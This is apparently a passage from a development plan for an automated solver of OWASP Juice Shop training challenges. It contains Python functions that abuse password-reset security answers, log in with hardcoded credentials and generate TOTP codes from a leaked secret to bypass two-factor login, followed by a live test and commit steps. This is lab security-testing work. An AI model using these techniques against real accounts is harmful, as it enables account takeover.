@register("resetPasswordBjoernChallenge", "Broken Authentication", 5)
def solve_reset_password_bjoern(ctx: SolverContext) -> None:
    _reset_password(ctx, f"bjoern@{DOMAIN}", "West-2082", "NewBjoernPassword1!")


@register("resetPasswordBjoernOwaspChallenge", "Broken Authentication", 3)
def solve_reset_password_bjoern_owasp(ctx: SolverContext) -> None:
    _reset_password(ctx, "bjoern@owasp.org", "Zaya", "NewBjoernOwaspPassword1!")


# --- routes/2fa.ts verify(): solved when the second-factor login for
# wurstbrot succeeds. His TOTP secret is stored in plaintext in
# data/static/users.yml (the challenge is precisely that: "unsafe secret
# storage"), so pyotp can generate a valid live code with it. ---

@register("twoFactorAuthUnsafeSecretStorageChallenge", "Broken Authentication", 5)
def solve_two_factor_auth(ctx: SolverContext) -> None:
    login_resp = ctx.client.login(f"wurstbrot@{DOMAIN}", "EinBelegtesBrotMitSchinkenSCHINKEN!")
    data = login_resp.json()
    tmp_token = data["data"]["tmpToken"]
    totp = pyotp.TOTP("IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH")
    ctx.client.verify_2fa(tmp_token, totp.now())
```

- [ ] **Step 2: Write the live verification test**

```python
# tests/test_broken_auth_live.py
import pytest

import solvers.broken_auth  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

BROKEN_AUTH_KEYS = [
    "weakPasswordChallenge", "oauthUserPasswordChallenge", "ghostLoginChallenge",
    "changePasswordBenderChallenge", "resetPasswordJimChallenge", "resetPasswordBenderChallenge",
    "resetPasswordBjoernChallenge", "resetPasswordBjoernOwaspChallenge",
    "twoFactorAuthUnsafeSecretStorageChallenge",
]


def test_all_broken_auth_challenges_solved():
    results = run_all(categories=["Broken Authentication"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in BROKEN_AUTH_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 3: Run the live test**

```bash
pytest tests/test_broken_auth_live.py -v
```

Expected: PASS.

**Important ordering note:** `changePasswordBenderChallenge` and the four
`resetPassword*Challenge` solvers all change a seeded user's password. Run
this test file's solvers only once per fresh Juice Shop instance (a fresh
`npm start` reseeds the in-memory/SQLite DB) — rerunning against the same
already-mutated instance is harmless for the challenge check itself (still
solved) but the *login* solvers for the same users (e.g.
`oauthUserPasswordChallenge`, `ghostLoginChallenge`) don't touch passwords, so
they're unaffected either way.

- [ ] **Step 4: Commit**

```bash
git add solvers/broken_auth.py tests/test_broken_auth_live.py
git commit -m "feat: solve all 9 Broken Authentication challenges"
```

---

### Task 5: Full Phase 1 report run

**Files:**
- No new files — this task runs the assembled CLI end-to-end.

**Interfaces:**
- Consumes everything from Tasks 1–4.

- [ ] **Step 1: Run the full Phase 1 slice against a fresh instance**

```bash
python main.py --category Injection --category XSS --category "Broken Authentication"
```

Expected output: a report table with `TOTAL: 28/28 solved`. If any key is not
solved, its `[FAIL]` line includes the captured HTTP error — fix that specific
solver function only, then rerun just that category with `--category <name>`.

- [ ] **Step 2: Commit the plan's completion marker**

```bash
git commit --allow-empty -m "chore: Phase 1 (Injection + XSS + Broken Authentication) complete — 28/28"
```
